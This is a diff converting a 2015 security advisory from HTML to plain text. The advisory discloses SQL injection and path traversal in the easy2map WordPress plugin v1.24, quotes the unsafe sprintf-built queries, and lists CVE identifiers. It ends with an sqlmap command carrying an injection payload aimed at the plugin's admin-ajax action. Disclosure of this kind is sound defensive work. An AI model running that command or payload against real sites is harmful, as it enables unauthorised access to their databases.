@@ -1,107 +1,52 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 */
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 131&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; SQL Injection in easy2map wordpress plugin v1.24&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2015-06-08&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="https://wordpress.org/plugins/easy2map">https://wordpress.org/plugins/easy2map</a>"&gt;<a href="https://wordpress.org/plugins/easy2map&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://wordpress.org/plugins/easy2map&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;Steven Ellis&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2015-06-08&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="https://profiles.wordpress.org/stevenellis/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://profiles.wordpress.org/stevenellis/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;The easiest tool available for creating custom &amp; great-looking Google Maps. Add multiple pins and customize maps with drag-and-drop simplicity.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;The following lines in Function.php use sprintf() to format queries being sent to the database, this doesn&amp;#039;t provide proper sanitization of user input or
-properly parameterize the query to the database.
-</p><pre>
-62         $wpdb-&amp;gt;query(sprintf(&amp;quot;UPDATE $mapsTable
-63         SET PolyLines = &amp;#039;%s&amp;#039;
-64         WHERE ID = &amp;#039;%s&amp;#039;;&amp;quot;, $PolyLines, $mapID));
-</pre>
-<p>.<br/>
-.<br/>
-.
-</p><pre>
-132             $wpdb-&amp;gt;query(sprintf(&amp;quot;
-133                 UPDATE $mapsTable
-134                 SET TemplateID = &amp;#039;%s&amp;#039;,
-135                     MapName = &amp;#039;%s&amp;#039;,
-136                     Settings = &amp;#039;%s&amp;#039;,
-137                     LastInvoked = CURRENT_TIMESTAMP,
-138                     CSSValues = &amp;#039;%s&amp;#039;,
-139                     CSSValuesList = &amp;#039;%s&amp;#039;,
-140                     CSSValuesHeading = &amp;#039;%s&amp;#039;,
-141                     MapHTML = &amp;#039;%s&amp;#039;,
-142                     IsActive = 1
-143                 WHERE ID = %s;&amp;quot;,
-144                     $Items[&amp;#039;mapTemplateName&amp;#039;],
-145                     $Items[&amp;#039;mapName&amp;#039;],
-146                     urldecode($Items[&amp;#039;mapSettingsXML&amp;#039;]),
-147                     urldecode($Items[&amp;quot;mapCSSXML&amp;quot;]),
-148                     urldecode($Items[&amp;quot;listCSSXML&amp;quot;]),
-149                     urldecode($Items[&amp;quot;headingCSSXML&amp;quot;]),
-150                     urldecode($Items[&amp;quot;mapHTML&amp;quot;]), $mapID));
-151         } else {
-152 
-153             //this is a map insert
-154             if (!$wpdb-&amp;gt;query(sprintf(&amp;quot;
-155             INSERT INTO $mapsTable(
-156                 TemplateID,
-157                 MapName,
-158                 DefaultPinImage,
-159                 Settings,
-160                 LastInvoked,
-161                 PolyLines,
-162                 CSSValues,
-163                 CSSValuesList,
-164                 CSSValuesHeading,
-165                 MapHTML,
-166                 IsActive
-167             ) VALUES (&amp;#039;%s&amp;#039;, &amp;#039;%s&amp;#039;, &amp;#039;%s&amp;#039;, &amp;#039;%s&amp;#039;, 
-168                     CURRENT_TIMESTAMP, &amp;#039;%s&amp;#039;, &amp;#039;%s&amp;#039;, &amp;#039;%s&amp;#039;, &amp;#039;%s&amp;#039;, &amp;#039;%s&amp;#039;, 0);&amp;quot;,
-169                     $Items[&amp;#039;mapTemplateName&amp;#039;],
-170                     $Items[&amp;#039;mapName&amp;#039;], str_replace(&amp;#039;index.php&amp;#039;, &amp;#039;&amp;#039;, easy2map_get_plugin_url(&amp;#039;/index.php&amp;#039;)) . &amp;quot;images/map_pins/p    ins/111.png&amp;quot;,
-171                     urldecode($Items[&amp;#039;mapSettingsXML&amp;#039;]), &amp;#039;&amp;#039;,
-172                     urldecode($Items[&amp;quot;mapCSSXML&amp;quot;]),
-173                     urldecode($Items[&amp;quot;listCSSXML&amp;quot;]),
-174                     urldecode($Items[&amp;quot;headingCSSXML&amp;quot;]),
-175                     urldecode($Items[&amp;quot;mapHTML&amp;quot;])))) {
-176                 die(&amp;quot;Error!&amp;quot;);
-177             }</pre>
-
-<p>.<br/>
-.
-</p><pre>
-231         $wpdb-&amp;gt;query(sprintf(&amp;quot;
-232             UPDATE $mapsTable
-233             SET MapName = &amp;#039;%s&amp;#039;,
-234             LastInvoked = CURRENT_TIMESTAMP,
-235             IsActive = 1
-236             WHERE ID = %s;&amp;quot;, $mapName, $mapID));</pre>
-<p>Path Traversal in Functions.php
-</p><p>221                $imagesDirectory = WP_CONTENT_DIR . &amp;quot;/uploads/&amp;quot;;
-</p><pre>
-                if (!is_dir($imagesDirectory)) {
-                    mkdir($imagesDirectory);
-                }
-                $imagesDirectory = WP_CONTENT_DIR . &amp;quot;/uploads/easy2map/&amp;quot;;
-                if (!is_dir($imagesDirectory)) {
-                    mkdir($imagesDirectory);
-                }
-                $imagesDirectory = WP_CONTENT_DIR . &amp;quot;/uploads/easy2map/images/&amp;quot;;
-                if (!is_dir($imagesDirectory)) {
-                    mkdir($imagesDirectory);
-                }
-                $imagesDirectory = WP_CONTENT_DIR . &amp;quot;/uploads/easy2map/images/map_pins/&amp;quot;;
-                if (!is_dir($imagesDirectory)) {
-                    mkdir($imagesDirectory);
-254                }</pre>
-
-<p>CVE-2015-4614 for SQL injection<br/>
-CVE-2015-4616 for Path traversal&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2015-4614 2015-4616 &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=131"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;$ sqlmap &lt;span style="color: #339933;"&gt;-&lt;/span&gt;u &lt;span style="color: #0000ff;"&gt;'<a href="http://wp.site:80/wp-admin/admin-ajax.php">http://wp.site:80/wp-admin/admin-ajax.php</a>'&lt;/span&gt; &lt;span style="color: #339933;"&gt;--&lt;/span&gt;data&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;&amp;quot;mapID=11&amp;amp;mapName='+or+1%3D%3D1%3B&amp;amp;action=e2m_img_save_map_name&amp;quot;&lt;/span&gt; &lt;span style="color: #339933;"&gt;--&lt;/span&gt;cookie&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'COOKIE HERE'&lt;/span&gt; &lt;span style="color: #339933;"&gt;--&lt;/span&gt;level&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;5&lt;/span&gt; &lt;span style="color: #339933;"&gt;--&lt;/span&gt;risk&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;3&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisory.php?v=131">http://www.vapid.dhs.org/advisory.php?v=131</a>"&gt;<a href="http://www.vapid.dhs.org/advisory.php?v=131&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisory.php?v=131&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
-&lt;/html&gt;
-</p>
-
-</body>
-</html>
+                                Advisory #: 131
+Title: SQL Injection in easy2map wordpress plugin v1.24
+Author:Larry W. Cashdollar, @_larry0
+Date: 2015-06-08
+Download Site: https://wordpress.org/plugins/easy2map
+Vendor:Steven Ellis
+Vendor Notified: 2015-06-08
+Vendor Contact: https://profiles.wordpress.org/stevenellis/
+Description: The easiest tool available for creating custom & great-looking
+Google Maps. Add multiple pins and customize maps with drag-and-drop
+simplicity.
+Vulnerability:
+The following lines in Function.php use sprintf() to format queries being sent
+to the database, this doesn't provide proper sanitization of user input or
+properly parameterize the query to the database. 62 $wpdb->query(sprintf
+("UPDATE $mapsTable 63 SET PolyLines = '%s' 64 WHERE ID = '%s';", $PolyLines,
+$mapID)); . . . 132 $wpdb->query(sprintf(" 133 UPDATE $mapsTable 134 SET
+TemplateID = '%s', 135 MapName = '%s', 136 Settings = '%s', 137 LastInvoked =
+CURRENT_TIMESTAMP, 138 CSSValues = '%s', 139 CSSValuesList = '%s', 140
+CSSValuesHeading = '%s', 141 MapHTML = '%s', 142 IsActive = 1 143 WHERE ID =
+%s;", 144 $Items['mapTemplateName'], 145 $Items['mapName'], 146 urldecode
+($Items['mapSettingsXML']), 147 urldecode($Items["mapCSSXML"]), 148 urldecode
+($Items["listCSSXML"]), 149 urldecode($Items["headingCSSXML"]), 150 urldecode
+($Items["mapHTML"]), $mapID)); 151 } else { 152 153 //this is a map insert 154
+if (!$wpdb->query(sprintf(" 155 INSERT INTO $mapsTable( 156 TemplateID, 157
+MapName, 158 DefaultPinImage, 159 Settings, 160 LastInvoked, 161 PolyLines, 162
+CSSValues, 163 CSSValuesList, 164 CSSValuesHeading, 165 MapHTML, 166 IsActive
+167 ) VALUES ('%s', '%s', '%s', '%s', 168 CURRENT_TIMESTAMP, '%s', '%s', '%s',
+'%s', '%s', 0);", 169 $Items['mapTemplateName'], 170 $Items['mapName'],
+str_replace('index.php', '', easy2map_get_plugin_url('/index.php')) . "images/
+map_pins/p ins/111.png", 171 urldecode($Items['mapSettingsXML']), '', 172
+urldecode($Items["mapCSSXML"]), 173 urldecode($Items["listCSSXML"]), 174
+urldecode($Items["headingCSSXML"]), 175 urldecode($Items["mapHTML"])))) { 176
+die("Error!"); 177 } . . 231 $wpdb->query(sprintf(" 232 UPDATE $mapsTable 233
+SET MapName = '%s', 234 LastInvoked = CURRENT_TIMESTAMP, 235 IsActive = 1 236
+WHERE ID = %s;", $mapName, $mapID)); Path Traversal in Functions.php 221
+$imagesDirectory = WP_CONTENT_DIR . "/uploads/"; if (!is_dir($imagesDirectory))
+{ mkdir($imagesDirectory); } $imagesDirectory = WP_CONTENT_DIR . "/uploads/
+easy2map/"; if (!is_dir($imagesDirectory)) { mkdir($imagesDirectory); }
+$imagesDirectory = WP_CONTENT_DIR . "/uploads/easy2map/images/"; if (!is_dir
+($imagesDirectory)) { mkdir($imagesDirectory); } $imagesDirectory =
+WP_CONTENT_DIR . "/uploads/easy2map/images/map_pins/"; if (!is_dir
+($imagesDirectory)) { mkdir($imagesDirectory); 254 } CVE-2015-4614 for SQL
+injection CVE-2015-4616 for Path traversal
+CVE-2015-4614 2015-4616
+JSON:Export
+Exploit Code:
+   1. $ sqlmap -u 'http://wp.site:80/wp-admin/admin-ajax.php' --
+      data="mapID=11&mapName='+or+1%3D%3D1%3B&action=e2m_img_save_map_name" --
+      cookie='COOKIE HERE' --level=5 --risk=3
+Screen Shots:
+Advisory: http://www.vapid.dhs.org/advisory.php?v=131
